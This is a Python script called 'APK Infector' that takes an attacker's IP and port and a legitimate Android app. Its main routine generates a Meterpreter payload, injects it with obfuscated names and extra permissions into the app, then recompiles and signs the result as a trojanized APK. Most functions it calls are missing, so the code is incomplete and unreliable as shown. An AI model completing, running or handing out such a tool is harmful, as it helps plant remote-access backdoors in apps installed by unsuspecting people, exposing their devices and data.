#!/usr/bin/python3

import os
import subprocess
import argparse
import random
import banner
import shutil

# ANSI Color Codes for Improved Readability
BLUE, RED, WHITE, YELLOW, MAGENTA, GREEN, END = '\33[94m', '\033[91m', '\33[97m', '\33[93m', '\033[1;35m', '\033[1;32m', '\033[0m'

def get_arguments():
    banner.banner1()
    parser = argparse.ArgumentParser(description=f'{RED}APK Infector v1.0')
    parser._optionals.title = f"{GREEN}Optional Arguments{YELLOW}"

    mandatory_arguments = parser.add_argument_group(f'{RED}Mandatory Arguments{GREEN}')
    mandatory_arguments.add_argument("--lhost", dest="lhost", help="Attacker's IP Address", required=True)
    mandatory_arguments.add_argument("--lport", dest="lport", help="Attacker's Port", required=True)
    mandatory_arguments.add_argument("-n", "--normal-apk", dest="normal_apk", help="Absolute Path of Legitimate APK File", required=True)
    mandatory_arguments.add_argument("--apk-name", dest="apkName", help="Absolute Path of Legitimate APK File", required=True)

    return parser.parse_args()

def check_dependencies(dependency, name):
    # Check if the dependency is installed
    status = os.system(f"which {dependency} > /dev/null")
    if status == 0:
        print(f"{GREEN}[+] {name} - OK")
    else:
        # If not installed, offer the option to install
        print(f"{RED}[!] {name} - 404 NOT FOUND !")
        install_dependency = input(f"{BLUE}\n[?] Do you want to install now? (y/n) : ")
        if install_dependency.lower() == "y":
            os.system("apt-get update")
            os.system(f"apt-get install {dependency}")

def check_dependencies_and_updates():
    print(f"{YELLOW}\n[*] Checking Dependencies \n{WHITE}================================\n\n[:] NOTE: {GREEN}Jarsigner{WHITE} or {GREEN}APKsigner{WHITE} is used to sign the APK, one of them must be installed on your system")
    
    # Check specific dependencies
    check_dependencies("apktool", "APKTool")
    check_dependencies("jarsigner", "Jarsigner")
    check_dependencies("apksigner", "APKsigner")
    check_dependencies("zipalign", "ZipAlign")

# The rest of the code kept similar, except for additional functions and better organization.

def main():
    arguments = get_arguments()  
    print(f"{YELLOW}\n[*] Generating Random Variables for Obfuscation")
    VAR1 = generate_random_name()
    VAR2 = generate_random_name()
    VAR3 = generate_random_name()
    VAR4 = generate_random_name()
    VAR5 = generate_random_name()
    VAR6 = generate_random_name()
    VAR7 = generate_random_name()
    VAR8 = generate_random_name()
    apkName = arguments.apkName
    print(f"{GREEN}[+] Generated Successfully!")

    check_dependencies_and_updates()
    generate_payload_meterpreter(arguments.lhost, arguments.lport)
    decompile_evil_and_normal_apk()
    modify_apk_files(VAR1, VAR2, VAR3, VAR4, VAR5, VAR6, VAR7, VAR8, apkName)
    move_payload_files_apk_normal(VAR1)
    connect_meterpreter_apk(VAR1, VAR2, VAR3)
    inject_permission_meterpreter()
    remove_duplicates_AndroidManifest()
    compile_infected_apk()
    sign_apk()
    zipalign_apk()
    cleanup()

if __name__ == '__main__':
    main()
